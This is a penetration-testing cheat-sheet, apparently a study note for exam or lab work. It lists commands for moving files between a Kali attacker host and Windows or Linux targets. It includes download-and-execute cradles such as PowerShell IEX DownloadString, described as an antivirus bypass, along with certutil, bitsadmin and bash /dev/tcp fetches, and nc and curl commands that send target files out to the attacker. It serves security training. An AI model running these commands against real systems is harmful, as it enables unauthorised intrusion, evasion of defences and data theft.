# File Transfers — Command Appendix

Part of [[COMMAND APPENDIX]]. Syntax-first reference for moving files between Kali and target. Full context in [[17. Windows Privilege Escalation]].

---

## Serve Files from Kali

```bash
# Python HTTP server (serves CWD — cd to the file's directory first)
python3 -m http.server 80        # port 80 (requires sudo)
python3 -m http.server 8080      # non-root alternative

# Impacket SMB server (for Windows targets that prefer SMB over HTTP)
sudo impacket-smbserver -smb2support CompData /home/kali/loot

# File upload receiver (accepts POST/PUT from curl/iwr)
pip3 install uploadserver
python3 -m uploadserver 8080
```

---

## Windows — Download to Target

```powershell
# iwr (Invoke-WebRequest) — most common, aliases: wget, curl in PowerShell
iwr http://KALI_IP/file.exe -OutFile file.exe

# WebClient.DownloadFile — saves to disk
(New-Object System.Net.WebClient).DownloadFile('http://KALI_IP/file.exe', 'C:\path\file.exe')

# DownloadString + IEX — in-memory execution, no file written to disk (AV bypass)
IEX (New-Object System.Net.WebClient).DownloadString('http://KALI_IP/script.ps1')

# Expand-Archive — unzip
Expand-Archive .\archive.zip -DestinationPath C:\target\dir -Force
```

```cmd
:: certutil — built-in LOLBIN downloader (no PowerShell required)
certutil -urlcache -split -f http://KALI_IP/file.exe file.exe

:: bitsadmin — BITS-based download (resilient, throttleable)
bitsadmin /transfer job /download /priority normal http://KALI_IP/file.exe C:\path\file.exe
```

```powershell
# Start-BitsTransfer — PowerShell wrapper for BITS
Start-BitsTransfer -Source http://KALI_IP/file.exe -Destination C:\path\file.exe
```

---

## Windows — Upload from Target

```powershell
# Upload to Kali's uploadserver
Invoke-RestMethod -Uri http://KALI_IP:8080/upload -Method POST -InFile C:\path\file.txt

# evil-winrm built-in (over WinRM connection — no HTTP server needed)
upload /home/kali/file.exe C:\Users\user\file.exe
download C:\Users\user\flag.txt /home/kali/flag.txt
```

---

## Linux — Download to Target

```bash
# wget
wget http://KALI_IP/file -O /path/file

# curl
curl http://KALI_IP/file -o localfile

# Python (when wget/curl missing)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://KALI_IP/file', 'file')"

# SCP from Kali to target (push)
scp /local/file user@TARGET:/home/user/

# Bash /dev/tcp (no tools required at all)
exec 3<>/dev/tcp/KALI_IP/80
echo -e "GET /file HTTP/1.1\r\nHost: KALI_IP\r\nConnection: close\r\n\r\n" >&3
cat <&3 > file   # strip HTTP headers from the start of output manually
```

---

## Linux — Upload from Target

```bash
# SCP from target to Kali (pull from Kali side)
scp user@TARGET:/path/file /local/destination/

# nc pipe (target sends, Kali receives)
# Kali: nc -lp 9999 > received_file
# Target: nc -w 3 KALI_IP 9999 < file_to_send

# curl to uploadserver
curl -F 'files=@/path/to/file' http://KALI_IP:8080/upload
```

---

## RDP Drive Mount

```bash
# Mount a Kali directory into an RDP session (appears as \\tsclient\kali\ on Windows)
xfreerdp /v:TARGET /u:user /p:password /drive:kali,/home/kali/transfers /dynamic-resolution +clipboard
```

Inside Windows RDP session:
```powershell
Copy-Item \\tsclient\kali\tool.exe C:\Users\user\Desktop\tool.exe
# Or browse via File Explorer → \\tsclient\kali
```

🔁 [[17. Windows Privilege Escalation]], [[15. Antivirus Evasion|Antivirus Evasion]]

#### Tags: #CommandAppendix #FileTransfers #Windows #Linux #iwr #certutil #bitsadmin #scp #nc #uploadserver #xfreerdp #DriveMount
## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
